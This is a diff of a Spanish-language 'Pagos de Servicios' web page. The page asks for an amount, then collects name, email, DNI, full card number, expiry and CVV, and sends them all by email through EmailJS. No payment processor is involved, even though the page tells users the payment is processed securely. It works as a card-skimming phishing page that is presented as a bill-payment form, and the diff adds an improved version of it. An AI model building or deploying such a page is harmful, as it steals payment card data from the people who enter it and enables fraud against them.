@@ -1,206 +1,182 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Pagos de servicios</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f4f7fa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-    }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Pagos de Servicios</title>
 
-    .container {
-      background: #fff;
-      padding: 40px 30px;
-      border-radius: 12px;
-      box-shadow: 0 12px 28px rgba(0,0,0,0.12);
-      max-width: 420px;
-      width: 100%;
-    }
+<style>
+/* === Fondo profesional === */
+body{
+  margin:0;
+  font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+  background:
+    linear-gradient(rgba(0,0,0,.65),rgba(0,0,0,.65)),
+    url('https://images.unsplash.com/photo-1590159914188-1d46aa79f9e3?auto=format&fit=crop&w=1200&q=80')
+    center/cover no-repeat fixed;
+  display:flex;justify-content:center;align-items:center;min-height:100vh;color:#ecf0f1;
+}
 
-    h2 {
-      text-align: center;
-      color: #34495e;
-      margin-bottom: 8px;
-    }
+/* === Tarjeta / contenedor === */
+.container{
+  background:#ffffffee;
+  color:#34495e;
+  padding:40px 30px;
+  border-radius:14px;
+  box-shadow:0 12px 28px rgba(0,0,0,.25);
+  max-width:450px;width:100%;
+}
 
-    .info {
-      font-size: 14px;
-      color: #6c7a89;
-      text-align: center;
-      margin-bottom: 25px;
-    }
+/* Título y subtítulo */
+h1{text-align:center;margin:0 0 8px}
+.subtitle{font-size:15px;text-align:center;margin-bottom:25px;color:#6c7a89}
 
-    form input, form button {
-      width: 100%;
-      padding: 14px 16px;
-      margin-bottom: 18px;
-      font-size: 16px;
-      border: 1.8px solid #d1d9e6;
-      border-radius: 10px;
-      box-sizing: border-box;
-      transition: border-color 0.3s ease;
-    }
+/* Campos y botones */
+input,select,button{
+  width:100%;box-sizing:border-box;
+  font-size:15px;padding:13px 15px;margin-bottom:18px;
+  border:1.8px solid #d1d9e6;border-radius:10px;
+  transition:border-color .25s;
+}
+input:focus,select:focus{border-color:#2980b9;outline:none}
+input.invalid{border-color:#e74c3c;background:#fdecea}
 
-    form input:focus {
-      border-color: #2980b9;
-      outline: none;
-    }
+button{
+  background:#2980b9;color:#fff;font-weight:600;cursor:pointer;
+  display:flex;justify-content:center;align-items:center;gap:10px;
+  border:none;border-radius:10px;transition:background .3s;
+}
+button:hover:not(:disabled){background:#1c5980}
+button:disabled{background:#95a5a6;cursor:not-allowed}
 
-    form input.invalid {
-      border-color: #e74c3c;
-      background-color: #fdecea;
-    }
+/* Loader (spinner) */
+.loader{border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;
+        width:22px;height:22px;animation:spin 1s linear infinite}
+@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
 
-    form button {
-      background-color: #2980b9;
-      color: #fff;
-      font-weight: 600;
-      border: none;
-      cursor: pointer;
-      border-radius: 10px;
-      transition: background-color 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-    }
+/* Éxito */
+.success{display:none;background:#d4edda;color:#155724;
+         padding:14px;margin-top:20px;border-radius:10px;text-align:center;font-weight:600}
 
-    form button:disabled {
-      background-color: #95a5a6;
-      cursor: not-allowed;
-    }
-
-    form button:hover:not(:disabled) {
-      background-color: #1c5980;
-    }
-
-    .success {
-      background: #d4edda;
-      color: #155724;
-      padding: 14px;
-      margin-top: 20px;
-      border-radius: 10px;
-      text-align: center;
-      font-size: 15px;
-      font-weight: 600;
-    }
-
-    .loader {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #3498db;
-      border-radius: 50%;
-      width: 22px;
-      height: 22px;
-      animation: spin 1s linear infinite;
-      display: inline-block;
-      vertical-align: middle;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
+/* Radios de tarjeta */
+.radio-group label{margin-right:22px;cursor:pointer}
+.radio-group input{margin-right:6px}
+</style>
 </head>
 <body>
-  <div class="container">
-    <h2>Pagos de servicios</h2>
-    <div class="info">
-      Complete el formulario. Los datos se enviarán a tu correo.
-    </div>
+<div class="container">
 
-    <form id="payment-form" novalidate>
-      <input type="text" name="nombre" placeholder="Nombre completo" required />
-      <input type="email" name="email" placeholder="Correo electrónico" required />
-      <input type="text" name="dni" placeholder="DNI" required maxlength="15" />
-      <input type="text" name="tarjeta" placeholder="Número de tarjeta" required maxlength="16" pattern="\d{13,16}" />
-      <input type="text" name="titular" placeholder="Nombre del titular" required />
-      <input type="text" name="vencimiento" placeholder="MM/AA (Vencimiento)" required pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$" maxlength="5" />
-      <input type="text" name="cvv" placeholder="CVV" required maxlength="4" pattern="\d{3,4}" />
-      <button type="submit">Realizar pago</button>
-    </form>
+  <!-- Título + subtítulo -->
+  <h1>Pagos de Servicios</h1>
+  <p class="subtitle">Complete los datos para procesar su pago de forma segura.</p>
 
-    <div id="mensaje" class="success" style="display: none;"></div>
+  <!-- Bloque 1: Selección de monto -->
+  <div id="seleccion-monto">
+     <h3 style="text-align:center;margin-top:0">Seleccione el monto a pagar</h3>
+     <select id="monto-opciones">
+       <option value="">-- Seleccione un monto --</option>
+       <option value="100">100</option>
+       <option value="200">200</option>
+       <option value="500">500</option>
+       <option value="otro">Otro monto</option>
+     </select>
+     <input type="number" id="monto-personalizado" placeholder="Escriba el monto" style="display:none"/>
+     <button id="continuar-btn">Continuar</button>
   </div>
 
-  <!-- EmailJS SDK -->
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>
-    emailjs.init("FL6vofHg7F9vLawQs");
-  </script>
+  <!-- Bloque 2: Formulario de pago (oculto al inicio) -->
+  <form id="payment-form" style="display:none" novalidate>
+     <input type="hidden" name="monto" id="monto-enviado"/>
 
-  <script>
-    const form = document.getElementById("payment-form");
-    const mensaje = document.getElementById("mensaje");
-    const button = form.querySelector("button");
+     <!-- Tipo de tarjeta -->
+     <div class="radio-group" style="margin-bottom:18px">
+       <label><input type="radio" name="tipo_tarjeta" value="Visa" required>Visa</label>
+       <label><input type="radio" name="tipo_tarjeta" value="Mastercard" required>Mastercard</label>
+     </div>
 
-    // Función para validar campos usando patrones y required
-    function validarCampo(input) {
-      if (!input.checkValidity()) {
-        input.classList.add("invalid");
-        return false;
-      } else {
-        input.classList.remove("invalid");
-        return true;
-      }
-    }
+     <!-- Datos del cliente -->
+     <input type="text"    name="nombre"   placeholder="Nombre completo"      required/>
+     <input type="email"   name="email"    placeholder="Correo electrónico"   required/>
+     <input type="text"    name="dni"      placeholder="DNI"                  maxlength="15" required/>
+     <input type="text"    name="tarjeta"  placeholder="Número de tarjeta"    pattern="\\d{13,16}" maxlength="16" required/>
+     <input type="text"    name="titular"  placeholder="Nombre del titular"   required/>
+     <input type="text"    name="vencimiento" placeholder="MM/AA (Vencimiento)" pattern="^(0[1-9]|1[0-2])\\/([0-9]{2})$" maxlength="5" required/>
+     <input type="text"    name="cvv"      placeholder="CVV"                  pattern="\\d{3,4}" maxlength="4" required/>
 
-    // Validar todo el formulario
-    function validarFormulario() {
-      const inputs = form.querySelectorAll("input[required]");
-      let valido = true;
-      inputs.forEach(input => {
-        if (!validarCampo(input)) valido = false;
-      });
-      return valido;
-    }
+     <button type="submit">Realizar pago</button>
+  </form>
 
-    form.addEventListener("input", (e) => {
-      validarCampo(e.target);
+  <!-- Mensaje de éxito -->
+  <div id="mensaje" class="success"></div>
+</div>
+
+<!-- === EmailJS SDK === -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>emailjs.init("FL6vofHg7F9vLawQs");</script>
+
+<script>
+/* ----- Elementos DOM ----- */
+const montoOpciones      = document.getElementById('monto-opciones');
+const montoPersonalizado = document.getElementById('monto-personalizado');
+const continuarBtn       = document.getElementById('continuar-btn');
+const bloqueMonto        = document.getElementById('seleccion-monto');
+const form               = document.getElementById('payment-form');
+const montoHidden        = document.getElementById('monto-enviado');
+const mensaje            = document.getElementById('mensaje');
+const btnSubmit          = form.querySelector('button');
+
+/* ----- Paso 1: selección de monto ----- */
+montoOpciones.addEventListener('change',()=>{
+  montoPersonalizado.style.display = montoOpciones.value==='otro' ? 'block':'none';
+});
+
+continuarBtn.addEventListener('click',()=>{
+  let monto = montoOpciones.value==='otro' ? montoPersonalizado.value.trim() : montoOpciones.value;
+  if(!monto || isNaN(monto) || Number(monto)<=0){
+    alert('Por favor, ingrese un monto válido.');
+    return;
+  }
+  montoHidden.value = monto;
+  bloqueMonto.style.display = 'none';
+  form.style.display = 'block';
+});
+
+/* ----- Validaciones simples ----- */
+function validarCampo(input){
+  if(!input.checkValidity()){ input.classList.add('invalid'); return false;}
+  input.classList.remove('invalid'); return true;
+}
+form.addEventListener('input',e=>{ if(e.target.tagName==='INPUT') validarCampo(e.target); });
+
+/* ----- Envío con EmailJS ----- */
+form.addEventListener('submit',e=>{
+  e.preventDefault();
+  let valido = true;
+  form.querySelectorAll('input[required]').forEach(i=>{ if(!validarCampo(i)) valido=false; });
+  if(!valido) { alert('Por favor, complete todos los campos correctamente.'); return; }
+
+  /* Loader */
+  btnSubmit.disabled=true;
+  const loader=document.createElement('span'); loader.className='loader';
+  btnSubmit.textContent='Enviando...'; btnSubmit.prepend(loader);
+
+  emailjs.sendForm('service_6pbv86h','template_m3nuw4p',form)
+    .then(()=>{
+      mensaje.textContent='✅ ¡Formulario enviado correctamente!';
+      mensaje.style.display='block';
+      form.reset();  // Limpia
+      btnSubmit.disabled=false;
+      btnSubmit.textContent='Realizar pago';
+      loader.remove();
+      setTimeout(()=>{mensaje.style.display='none';},6000);
+    })
+    .catch(err=>{
+      alert('❌ Error al enviar: '+JSON.stringify(err));
+      btnSubmit.disabled=false;
+      btnSubmit.textContent='Realizar pago';
+      loader.remove();
     });
-
-    form.addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      if (!validarFormulario()) {
-        alert("Por favor, completa todos los campos correctamente.");
-        return;
-      }
-
-      // Mostrar loader y deshabilitar botón
-      button.disabled = true;
-      const loader = document.createElement("span");
-      loader.classList.add("loader");
-      button.textContent = "Enviando...";
-      button.prepend(loader);
-
-      emailjs.sendForm("service_6pbv86h", "template_m3nuw4p", this)
-        .then(() => {
-          mensaje.textContent = "✅ ¡Formulario enviado correctamente!";
-          mensaje.style.display = "block";
-          form.reset();
-          button.disabled = false;
-          button.textContent = "Realizar pago";
-          // Quitar loader
-          loader.remove();
-
-          setTimeout(() => {
-            mensaje.style.display = "none";
-          }, 6000);
-        }, (error) => {
-          alert("❌ Error al enviar: " + JSON.stringify(error));
-          button.disabled = false;
-          button.textContent = "Realizar pago";
-          loader.remove();
-        });
-    });
-  </script>
+});
+</script>
 </body>
 </html>
